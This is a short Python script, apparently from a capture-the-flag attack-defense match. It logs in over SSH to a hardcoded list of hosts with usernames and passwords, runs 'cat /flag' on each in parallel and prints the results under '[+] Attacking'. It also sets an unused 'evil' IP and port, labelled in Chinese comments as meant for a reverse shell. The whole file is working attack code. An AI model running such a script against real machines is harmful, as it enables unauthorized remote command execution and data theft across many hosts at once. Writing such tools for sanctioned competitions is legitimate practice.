# -*- coding:utf-8 -*-
import paramiko
import threading
### 格式：ip 端口 用户名 密码 ###
###   空格分隔，每行一条数据  ###
users='''
192.168.137.132 22 asd asd
192.168.137.129 22 asd asd

'''
def Async(f):
	def wrapper(*args, **kwargs):
		thr = threading.Thread(target=f, args=args, kwargs=kwargs)
		thr.start()

	return wrapper
# ssh 用户名 密码 登陆
@Async
def ssh_base_pwd(ip, port, username, passwd, cmd):
	try:
		port1 = int(port)
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(hostname=ip, port=port, username=username, password=passwd)
		stdin, stdout, stderr = ssh.exec_command(cmd)
		result = stdout.read()
		if not result:
			print("无结果!")
		else:
			print(ip,result.decode())
		ssh.close()
		return result.decode()
	except:
		pass

evilTarget = "192.168.100.36"  # 恶意ip(用于反弹shell)
evilPort = 4444			 # 恶意端口(用于反弹shell)
cmd = "cat /flag"
#cmd = "ifconfig"

lines=users.split('\n')
for line in lines:
	if(line != ''):
		ip,port,username,password=line.split(' ')
		print("[+] Attacking " + ip)
		ssh_base_pwd(ip, port, username, password, cmd)
